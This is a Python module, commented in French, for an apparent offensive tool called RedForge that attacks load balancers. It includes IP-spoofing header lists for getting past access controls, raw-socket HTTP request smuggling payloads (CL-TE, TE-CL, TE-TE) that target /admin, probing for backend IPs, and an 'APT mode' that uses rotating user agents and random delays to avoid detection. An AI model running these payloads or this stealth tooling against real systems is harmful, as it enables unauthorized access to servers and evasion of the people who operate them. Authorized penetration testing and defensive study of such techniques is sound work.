#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'attaques sur load balancer pour RedForge
Détection et exploitation des vulnérabilités des load balancers
Version avec support furtif, APT et techniques avancées
"""

import time
import random
import hashlib
import requests
import socket
import re
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

@dataclass
class LoadBalancerConfig:
    """Configuration avancée pour la détection de load balancers"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    request_count: int = 20
    test_stickiness: bool = True
    test_bypass: bool = True
    test_smuggling: bool = True
    test_algorithm: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_backend_ips: bool = True
    test_session_riding: bool = True
    max_servers: int = 10


class LoadBalancerAttack:
    """Détection et exploitation avancée des load balancers"""
    
    def __init__(self, config: Optional[LoadBalancerConfig] = None):
        """
        Initialise le détecteur de load balancers
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or LoadBalancerConfig()
        
        # Headers de load balancer
        self.load_balancer_headers = {
            'X-LB-Node', 'X-Load-Balancer', 'X-Backend-Server',
            'X-Cluster-Node', 'X-Forwarded-For', 'X-Real-IP',
            'X-Forwarded-Proto', 'X-Forwarded-Host', 'X-Backend',
            'X-Proxy-Backend', 'X-Server-Name', 'X-Upstream'
        }
        
        # Signatures de load balancers
        self.lb_signatures = {
            'HAProxy': ['haproxy', 'x-forwarded-for', 'x-request-id'],
            'Nginx': ['nginx', 'x-proxy-cache', 'x-accel'],
            'AWS ELB': ['aws-elb', 'x-amz-cf-id', 'x-amzn-requestid'],
            'Cloudflare': ['cloudflare', 'cf-ray', 'cf-cache-status'],
            'F5 Big-IP': ['bigip', 'x-f5', 'x-wa-info'],
            'Citrix Netscaler': ['netscaler', 'nsaf', 'citrix'],
            'Apache': ['apache', 'x-mod-pagespeed'],
            'Varnish': ['varnish', 'x-varnish', 'x-cache']
        }
        
        # Patterns de persistance
        self.stickiness_patterns = {
            'cookie': ['JSESSIONID', 'PHPSESSID', 'ASP.NET_SessionId', 'SESSION'],
            'url': ['route', 'affinity', 'backend', 'server'],
            'header': ['x-affinity', 'x-backend', 'x-server'],
            'ip': ['source_ip', 'client_ip']
        }
        
        # Headers de contournement
        self.bypass_headers = [
            ('X-Forwarded-For', '127.0.0.1'),
            ('X-Originating-IP', '127.0.0.1'),
            ('X-Remote-IP', '127.0.0.1'),
            ('X-Remote-Addr', '127.0.0.1'),
            ('X-Client-IP', '127.0.0.1'),
            ('X-Real-IP', '127.0.0.1'),
            ('X-Forwarded-For', 'localhost'),
            ('X-Cluster-Client-IP', '127.0.0.1')
        ]
        
        # Payloads de request smuggling
        self.smuggling_payloads = [
            # CL-TE (Content-Length, Transfer-Encoding)
            "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 44\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n",
            # TE-CL (Transfer-Encoding, Content-Length)
            "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n0\r\n\r\n",
            # TE-TE
            "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
        ]
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
        self.backend_servers = set()
        self.session_servers = []
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités liées aux load balancers
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - requests_count: Nombre de requêtes pour détection
                - test_stickiness: Tester la persistance de session
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        self.backend_servers.clear()
        self.session_servers.clear()
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Test des load balancers sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        
        # Détection du load balancer
        lb_info = self._detect_load_balancer_advanced(target)
        
        if lb_info['detected']:
            print(f"      ✓ Load balancer détecté: {lb_info['type']}")
            if lb_info.get('algorithm'):
                print(f"      ✓ Algorithme: {lb_info['algorithm']}")
            if lb_info.get('server_count'):
                print(f"      ✓ Serveurs backend: {lb_info['server_count']}")
            
            # Test de la persistance de session
            if self.config.test_stickiness:
                stickiness = self._test_session_stickiness_advanced(target)
                if stickiness['vulnerable']:
                    self.vulnerabilities_found += 1
                    vulnerabilities.append({
                        "type": "session_stickiness",
                        "severity": "MEDIUM",
                        "details": stickiness['details'],
                        "method": stickiness['method'],
                        "risk_score": 65
                    })
                    print(f"      ✓ Faiblesse de persistance détectée: {stickiness['method']}")
            
            # Test de l'algorithme de load balancing
            if self.config.test_algorithm:
                algorithm_info = self._detect_lb_algorithm(target)
                if algorithm_info.get('algorithm'):
                    lb_info['algorithm'] = algorithm_info['algorithm']
            
            # Test du contournement
            if self.config.test_bypass:
                bypass_result = self._test_load_balancer_bypass_advanced(target)
                if bypass_result['vulnerable']:
                    self.vulnerabilities_found += 1
                    vulnerabilities.append({
                        "type": "load_balancer_bypass",
                        "severity": "HIGH",
                        "details": bypass_result['details'],
                        "headers": bypass_result['headers'],
                        "risk_score": 80
                    })
                    print(f"      ✓ Contournement load balancer possible")
            
            # Test du request smuggling
            if self.config.test_smuggling:
                desync_result = self._test_request_smuggling_advanced(target)
                if desync_result['vulnerable']:
                    self.vulnerabilities_found += 1
                    vulnerabilities.append({
                        "type": "request_smuggling",
                        "severity": "CRITICAL",
                        "details": desync_result['details'],
                        "risk_score": 95
                    })
                    print(f"      ✓ Request smuggling possible")
            
            # Détection des IPs backend
            if self.config.detect_backend_ips:
                backend_ips = self.get_backend_ips(target)
                if backend_ips:
                    lb_info['backend_ips'] = backend_ips
                    print(f"      ✓ Backend IPs: {', '.join(backend_ips[:3])}")
        
        return self._generate_results(target, lb_info, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'request_count' in kwargs:
            self.config.request_count = kwargs['request_count']
        if 'test_stickiness' in kwargs:
            self.config.test_stickiness = kwargs['test_stickiness']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.request_count = min(self.config.request_count, 10)
            self.config.delay_between_tests = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _detect_load_balancer_advanced(self, target: str) -> Dict[str, Any]:
        """
        Détection avancée de load balancer
        
        Args:
            target: URL cible
        """
        result = {
            "detected": False,
            "type": None,
            "algorithm": None,
            "server_count": 0,
            "servers": [],
            "headers": {}
        }
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            # Analyser les headers
            for header in self.load_balancer_headers:
                if header in response.headers:
                    result["detected"] = True
                    result["headers"][header] = response.headers[header]
            
            # Identifier le type via signatures
            for lb_name, signatures in self.lb_signatures.items():
                for sig in signatures:
                    if sig in str(response.headers).lower():
                        result["type"] = lb_name
                        result["detected"] = True
                        break
                if result["type"]:
                    break
            
            # Détection par analyse de réponses multiples
            response_hashes = []
            unique_servers = set()
            
            for i in range(min(self.config.request_count, 15)):
                if self.config.random_delays:
                    time.sleep(random.uniform(0.2, 0.5))
                
                resp = requests.get(target, headers=headers, timeout=10, verify=False)
                content_hash = hashlib.md5(resp.text[:500].encode()).hexdigest()
                response_hashes.append(content_hash)
                
                # Extraire des identifiants de serveur potentiels
                server_id = self._extract_server_id(resp)
                if server_id:
                    unique_servers.add(server_id)
                
                if self.config.apt_mode and i >= 5:
                    break
            
            unique_responses = set(response_hashes)
            if len(unique_responses) > 1:
                result["detected"] = True
                result["server_count"] = len(unique_responses)
                result["servers"] = list(unique_responses)
                
                if not result["type"]:
                    result["type"] = "Multi-server"
            
            if unique_servers:
                result["server_count"] = max(result["server_count"], len(unique_servers))
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _extract_server_id(self, response: requests.Response) -> Optional[str]:
        """Extrait un identifiant de serveur potentiel"""
        # Vérifier les headers
        server_headers = ['X-Backend-Server', 'X-LB-Node', 'X-Server-Name', 
                         'X-Upstream', 'Server', 'X-Powered-By']
        
        for header in server_headers:
            if header in response.headers:
                return response.headers[header]
        
        # Vérifier les cookies
        for cookie in response.cookies:
            if any(pattern in cookie.name for pattern in ['server', 'backend', 'node']):
                return cookie.value
        
        return None
    
    def _detect_lb_algorithm(self, target: str) -> Dict[str, Any]:
        """
        Détecte l'algorithme de load balancing utilisé
        
        Args:
            target: URL cible
        """
        result = {"algorithm": None, "confidence": 0}
        
        # Tester différents patterns de distribution
        server_assignments = []
        
        for i in range(20):
            resp = requests.get(target, timeout=10, verify=False)
            server_hash = hashlib.md5(resp.text[:200].encode()).hexdigest()
            server_assignments.append(server_hash)
            time.sleep(0.2)
        
        # Analyser le pattern
        unique_servers = set(server_assignments)
        
        if len(unique_servers) == 1:
            result["algorithm"] = "sticky_session"
            result["confidence"] = 80
        elif len(unique_servers) == len(server_assignments):
            # Vérifier si c'est round-robin
            if self._is_round_robin(server_assignments):
                result["algorithm"] = "round_robin"
                result["confidence"] = 85
            else:
                result["algorithm"] = "random"
                result["confidence"] = 70
        elif len(unique_servers) < len(server_assignments):
            result["algorithm"] = "weighted"
            result["confidence"] = 60
        
        return result
    
    def _is_round_robin(self, assignments: List[str]) -> bool:
        """Vérifie si le pattern correspond à round-robin"""
        if len(assignments) < 4:
            return False
        
        # Vérifier la séquence cyclique
        for i in range(len(assignments) - 2):
            if assignments[i] == assignments[i+2]:
                return True
        return False
    
    def _test_session_stickiness_advanced(self, target: str) -> Dict[str, Any]:
        """
        Test avancé de la persistance de session
        
        Args:
            target: URL cible
        """
        result = {
            "vulnerable": False,
            "details": None,
            "method": None
        }
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            # Extraire les cookies de session
            session_cookies = {}
            for cookie in response.cookies:
                if any(pattern in cookie.name for pattern in self.stickiness_patterns['cookie']):
                    session_cookies[cookie.name] = cookie.value
            
            if session_cookies:
                server_assignments = []
                
                for _ in range(min(10, self.config.request_count)):
                    resp = requests.get(target, cookies=session_cookies, headers=headers, timeout=10, verify=False)
                    server_hash = hashlib.md5(resp.text[:200].encode()).hexdigest()
                    server_assignments.append(server_hash)
                    
                    if self.config.random_delays:
                        time.sleep(random.uniform(0.3, 0.8))
                
                # Vérifier la persistance
                if len(set(server_assignments)) == 1:
                    result["vulnerable"] = True
                    result["details"] = "Session collante faiblement implémentée - fixation possible"
                    result["method"] = "session_fixation"
                elif len(set(server_assignments)) > 1:
                    result["vulnerable"] = True
                    result["details"] = "Persistance de session inconsistante"
                    result["method"] = "session_migration"
                    
        except Exception:
            pass
        
        return result
    
    def _test_load_balancer_bypass_advanced(self, target: str) -> Dict[str, Any]:
        """
        Test avancé de contournement du load balancer
        
        Args:
            target: URL cible
        """
        result = {
            "vulnerable": False,
            "details": None,
            "headers": []
        }
        
        for header_name, header_value in self.bypass_headers:
            try:
                headers = self._get_stealth_headers({header_name: header_value})
                response = requests.get(target, headers=headers, timeout=10, verify=False)
                
                # Vérifier les indicateurs de succès
                indicators = ['admin', 'internal', 'debug', 'config', 'status']
                for indicator in indicators:
                    if indicator in response.text.lower():
                        result["vulnerable"] = True
                        result["details"] = f"Contournement via {header_name}"
                        result["headers"].append(f"{header_name}: {header_value}")
                        break
                
                # Vérifier les headers de réponse inhabituels
                if 'X-Backend-Server' in response.headers:
                    result["vulnerable"] = True
                    result["details"] = f"Exposition du backend via {header_name}"
                    result["headers"].append(f"{header_name}: {header_value}")
                    
            except Exception:
                continue
        
        return result
    
    def _test_request_smuggling_advanced(self, target: str) -> Dict[str, Any]:
        """
        Test avancé de request smuggling
        
        Args:
            target: URL cible
        """
        result = {
            "vulnerable": False,
            "details": None
        }
        
        parsed = urlparse(target)
        host = parsed.netloc
        
        for payload_template in self.smuggling_payloads:
            payload = payload_template.format(host=host)
            
            try:
                # Envoyer le payload via socket brut
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((parsed.hostname or 'localhost', parsed.port or 80))
                sock.send(payload.encode())
                
                response = sock.recv(4096).decode('utf-8', errors='ignore')
                sock.close()
                
                # Vérifier les indicateurs de succès
                if 'admin' in response.lower() or 'internal' in response.lower():
                    result["vulnerable"] = True
                    result["details"] = "Request smuggling détecté"
                    break
                    
            except Exception:
                continue
        
        return result
    
    def get_backend_ips(self, target: str) -> List[str]:
        """
        Tente de découvrir les IPs des serveurs backend
        
        Args:
            target: URL cible
        """
        backend_ips = set()
        
        try:
            # Méthode 1: Headers X-Forwarded-For
            headers = self._get_stealth_headers({'X-Forwarded-For': '127.0.0.1'})
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
            ips = re.findall(ip_pattern, response.text)
            backend_ips.update(ips)
            
            # Méthode 2: En-têtes de réponse
            for header in ['X-Backend-Server', 'X-Real-IP', 'X-Forwarded-For']:
                if header in response.headers:
                    ip_match = re.search(ip_pattern, response.headers[header])
                    if ip_match:
                        backend_ips.add(ip_match.group())
            
            # Méthode 3: Résolution DNS
            parsed = urlparse(target)
            try:
                ips = socket.gethostbyname_ex(parsed.hostname)[2]
                backend_ips.update(ips)
            except:
                pass
                
        except Exception:
            pass
        
        return list(backend_ips)[:self.config.max_servers]
    
    def _generate_results(self, target: str, lb_info: Dict, 
                         vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "load_balancer_detected": lb_info['detected'],
            "type": lb_info.get('type'),
            "algorithm": lb_info.get('algorithm'),
            "servers": lb_info.get('servers', []),
            "server_count": lb_info.get('server_count', 0),
            "backend_ips": lb_info.get('backend_ips', []),
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "tests_performed": self.tests_performed,
            "scan_duration": duration,
            "config": {
                "apt_mode": self.config.apt_mode,
                "request_count": self.config.request_count,
                "test_stickiness": self.config.test_stickiness
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities, lb_info)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité détectée"}
        
        return {
            "total": len(vulnerabilities),
            "critical": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL']),
            "high": len([v for v in vulnerabilities if v['severity'] == 'HIGH']),
            "medium": len([v for v in vulnerabilities if v['severity'] == 'MEDIUM']),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict], 
                                   lb_info: Dict) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if lb_info.get('detected'):
            recommendations.add("Configurer le load balancer pour ne pas divulguer d'informations internes")
        
        if any(v['type'] == 'session_stickiness' for v in vulnerabilities):
            recommendations.add("Implémenter une persistance de session sécurisée avec chiffrement")
            recommendations.add("Utiliser des cookies signés pour la persistance")
        
        if any(v['type'] == 'load_balancer_bypass' for v in vulnerabilities):
            recommendations.add("Valider strictement les headers X-Forwarded-*")
            recommendations.add("Configurer les règles de pare-feu pour bloquer les IPs internes")
        
        if any(v['type'] == 'request_smuggling' for v in vulnerabilities):
            recommendations.add("Normaliser les requêtes HTTP entrantes")
            recommendations.add("Utiliser la même logique de parsing HTTP sur tous les composants")
        
        if lb_info.get('algorithm') == 'sticky_session':
            recommendations.add("Ajouter une expiration aux sessions collantes")
        
        return list(recommendations)
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "tests_performed": self.tests_performed,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.tests_performed) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    lba = LoadBalancerAttack()
    results = lba.scan("https://example.com")
    print(f"Load balancer détecté: {results['load_balancer_detected']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = LoadBalancerConfig(apt_mode=True, request_count=10)
    lba_apt = LoadBalancerAttack(config=apt_config)
    results_apt = lba_apt.scan("https://example.com", apt_mode=True)
    print(f"Load balancer (APT): {results_apt['load_balancer_detected']}")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")